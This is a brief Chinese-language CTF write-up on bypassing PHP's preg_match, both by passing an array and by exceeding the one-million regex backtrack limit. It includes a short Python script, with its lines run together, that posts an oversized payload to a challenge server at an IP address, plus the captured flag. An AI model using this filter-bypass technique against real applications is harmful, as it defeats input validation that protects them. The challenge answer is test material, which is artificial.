这里提到一个preg\_match函数：用于执行一个正则表达式匹配,由于preg\_match函数不能处理数组，因此在CTF中常常可以同过构造数组来进行绕过。

再看本题还有一个判断数组的函数，是想让正则中的 .\*匹配到后面的所有内容，然后再回溯匹配，因为回溯次数上限默认是 100 万。那么，假设我们的回溯次数超过了 100 万，把字符长度加到100万以上，使其匹配超出限制返回false。

下面是python3实现的代码：

```
from requests import post
payload = {'greeting':'Baby PHP'+'a' * 1000000}res = post('http://120.27.3.220:10001/index.php',data=payload)print(res.text)
##flag{dad3a37aa9d50688b5157698acfd7aee}
```
